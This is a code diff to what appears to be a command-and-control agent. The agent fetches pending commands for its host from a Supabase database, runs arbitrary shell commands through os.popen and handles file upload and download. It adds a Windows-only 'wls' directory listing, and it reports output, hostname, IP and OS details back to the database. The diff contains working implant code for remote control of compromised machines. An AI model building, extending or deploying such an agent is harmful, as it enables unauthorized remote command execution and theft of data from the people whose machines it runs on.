@@ -6,6 +6,10 @@ from .file_operations import handle_download_command, handle_upload_command, fet
 from .system_info import get_system_info
 from .config import SUPABASE_KEY
 
+# Conditional import based on the operating system
+if os.name == 'nt':  # 'nt' indicates Windows
+    from .winAPI import wls  # Import the wls function
+
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
     if command_text.strip().lower() == "kill":
@@ -61,21 +65,39 @@ def execute_commands(supabase: Client):
                 else:
                     supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()
 
-    # Handle other commands
+    # Fetch and handle commands for the hostname
     pending_commands_response = fetch_pending_commands_for_hostname(hostname, supabase)
     if pending_commands_response.data:
         for command in pending_commands_response.data:
             command_id = command['id']
-            command_text = command['command']
+            command_text = command.get('command', '')  # Ensure command_text is always defined
             username = command.get('username', 'Unknown')
 
             # Handle kill command (this will exit the script if applicable)
-            handle_kill_command(command_id, command_text, hostname, supabase)
+            if command_text.lower().startswith('kill'):
+                handle_kill_command(command_id, command_text, hostname, supabase)
 
-            if command_text.lower().startswith('download'):
+            # Handle 'wls' command only if on Windows
+            elif os.name == 'nt' and command_text.lower().startswith('wls'):
+                try:
+                    path = command_text.split(' ', 1)[1]  # Expecting command to be in format "wls [path]"
+                    result = wls(path)
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+
+            # Handle download command
+            elif command_text.lower().startswith('download'):
                 status, output = handle_download_command(command_text, username, supabase)
+
+            # Handle upload command
             elif command_text.lower().startswith('upload'):
                 status, output = handle_upload_command(command_text, username, supabase)
+
+            # Handle generic shell commands
             else:
                 try:
                     result = os.popen(command_text).read()
@@ -84,4 +106,4 @@ def execute_commands(supabase: Client):
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-            update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
